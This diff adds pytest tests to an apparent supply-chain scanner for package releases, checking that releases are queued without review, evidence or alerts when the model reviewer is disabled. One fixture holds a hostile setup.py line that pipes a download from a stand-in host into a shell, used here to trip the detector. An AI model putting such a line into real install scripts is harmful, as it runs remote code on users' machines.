@@ -71,3 +71,63 @@ def test_a_label_on_a_queued_release_says_no_model_review(tmp_path, label, flagg
     assert "UNREVIEWED: no model reviewed it; labelled by a person." in html
     c = dashboard.counts(rows)
     assert (c["model_reviewed"], c["model_flagged"], c["not_scanned"]) == (1, flagged, 0)
+
+
+# --- the reviewer is off -------------------------------------------------------------------------------------
+
+_EVIL_SETUP = b"import os\nos.system('curl http://x | sh')\n"
+_PLAIN_SETUP = b"from setuptools import setup\nsetup()\n"
+
+
+def _art(files=None, **kw):
+    return ArtifactSet("pkg", "1.1", "1.0", "sdist", files or {"setup.py": _EVIL_SETUP},
+                       {"setup.py": _PLAIN_SETUP}, {}, kw.pop("added_binaries", []), **kw)
+
+
+def _emitted(monkeypatch):
+    calls = []
+    monkeypatch.setattr(orchestrator.notifier, "emit", lambda *a, **k: calls.append(a) or True)
+    return calls
+
+
+def _scan(cfg, conn, rvw, art, **kw):
+    orchestrator._process_fetched(cfg, conn, rvw, orchestrator._load_ruleset(cfg), NewRelease("pkg", "1.1", 5), art,
+                                  **kw)
+    return conn.execute("SELECT id FROM releases WHERE package='pkg' AND version='1.1'").fetchone()[0]
+
+
+def _assert_queued_disabled(conn, rid):
+    row = conn.execute("SELECT stage, pending_reason, review_input, review_input_chars, evidence FROM releases "
+                       "WHERE id=?", (rid,)).fetchone()
+    assert (row["stage"], row["pending_reason"], row["review_input_chars"]) == ("pending_review", "reviewer_disabled", 0)
+    assert zlib.decompress(row["review_input"]) == b"" and row["evidence"] is None
+    assert store.get_evidence(conn, rid) is None
+    assert conn.execute("SELECT count(*) FROM verdicts").fetchone()[0] == 0
+
+
+def test_reviewer_disabled_queues_the_release_with_no_input_no_evidence_no_verdict_and_no_alert(tmp_path,
+                                                                                                monkeypatch):
+    emitted = _emitted(monkeypatch)
+    cfg = dataclasses.replace(_cfg(tmp_path), reviewer_enabled=False)
+    conn = store.connect(cfg); store.init_schema(conn)
+    rid = _scan(cfg, conn, None, _art())
+    assert emitted == []
+    _assert_queued_disabled(conn, rid)
+    assert conn.execute("SELECT triage_score FROM releases WHERE id=?", (rid,)).fetchone()[0] >= cfg.threshold_t
+    # `capture-evidence --release-id <id> --all` can still download it and store its flagged code on demand
+    assert [r["release_id"] for r in store.releases_needing_evidence(conn, rid, all_flagged=True)] == [rid]
+
+
+def test_reviewer_off_one_oversized_source_alone_queues_silently(tmp_path, monkeypatch):
+    # PR A's M2: weight 40 makes one oversized .py escalate alone. With the reviewer off it never reaches no_content.
+    emitted = _emitted(monkeypatch)
+    cfg = dataclasses.replace(_cfg(tmp_path), reviewer_enabled=False)
+    conn = store.connect(cfg); store.init_schema(conn)
+    art = ArtifactSet("pkg", "1.1", "1.0", "sdist", {"PKG-INFO": b"Version: 1.1\n"}, {"PKG-INFO": b"Version: 1.0\n"},
+                      {}, added_binaries=[{"path": "pkg/big.py", "size": 5_000_000, "reason": "source-too-large",
+                                           "sha256": "ab"}],
+                      is_new_package=False, maintainer_metadata=None, added_dep_findings=[], too_large=("pkg/big.py",))
+    rid = _scan(cfg, conn, None, art)
+    rules = [r["rule"] for r in json.loads(conn.execute("SELECT triage_rules FROM releases").fetchone()[0])]
+    assert rules == ["binary-source-too-large"] and emitted == []
+    _assert_queued_disabled(conn, rid)
